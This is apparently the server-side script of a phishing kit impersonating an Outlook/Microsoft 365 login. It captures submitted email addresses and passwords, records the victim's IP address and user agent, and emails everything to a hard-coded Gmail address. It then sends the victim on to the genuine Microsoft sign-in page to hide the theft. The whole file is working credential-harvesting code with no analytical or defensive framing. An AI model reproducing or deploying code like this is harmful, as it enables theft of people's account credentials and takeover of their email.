<?php
if($_POST["email"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------|OUTL00k E M A I L  |--------------|\n";
$message .= "Online ID            : ".$_POST['email']."\n";
$message .= "Passcode              : ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- FUDPAGES [.] RU --------------|\n";
$send = "krayondonbalour7@gmail.com";
$subject = "Login | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office365.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=eb76b273-c873-4646-9317-a3ce9fe84ce1&protectedtoken=true&nonce=636747881500199391.f56e4a6d-7183-4f0a-baf2-126c0b9df18d&state=Dcs7EoAgDABR0M67IAmfhBwniDjOOFJ6fSnedmuNMeu0TBZmDFMkTlwKZgAUiYJ7z3QmpeYYS3Spg7qqPTgMdECV1rE0O9_Nj0_9M677_QE&sso_reload=true");
}else{
header ("Location: index.php");
}

?>